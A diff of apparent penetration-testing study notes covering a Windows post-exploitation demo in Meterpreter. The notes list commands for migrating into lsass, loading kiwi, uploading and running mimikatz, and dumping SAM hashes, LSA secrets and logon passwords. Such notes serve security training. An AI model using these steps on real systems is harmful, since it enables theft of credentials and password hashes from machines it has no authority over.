@@ -657,21 +657,32 @@ Demo
 	- sysinfo 
 	- getuid 
 	- migrate to lsass.exe find processid: pgrep lsass - migrate to lsass
+		- we need higher priviliges for lsass 
 	- sysinfo (authority\\system is the highest privileges')
 	- we will use kiki
 		- load kiwi 
 		- ?
-		- creds_all 
+		- attempt to retrieve credentials such as usernames, passwords, domain information, and NTLM hashes for logged-in users.: **creds_all** 
 			- later versions of  windows  do not store cleartext passwords 
-		- lsa_dump_sam 
-			- SAM is encrypted with syskey, also provided by kiki 
+		- Mimikatz commands can be used to extract NTLM hashes via the LSA: **lsa_dump_sam** 
+			- SAM is encrypted with syskey, also provided by kiwi 
+			- specifically targets the SAM database to retrieve password hashes.
 		- clear 
 	- pwd 
 	- navigate to C:\\\\ 
 		- mkdir Temp 
-		- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe 
-
-
+		- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+		- open a command shell session: shell
+			- dir 
+			- execute mimikatz: .\\mimikatz.exe 
+			- privilege::debug ![[Pasted image 20230707131337.png]]
+							 if it is 20= you have required privileges to perform hash extraction from memory 
+		- Mimikatz: lsadump::sam
+			- RID 500 -> this is indeed administrator 
+		- Mimikatz: lsadump::secret 
+		- Mimikatz: sekurlsa::logonpasswords  ![[Pasted image 20230707132811.png]]
+				null means cleartext passwords have been disabled 
+		- 
 
 
 
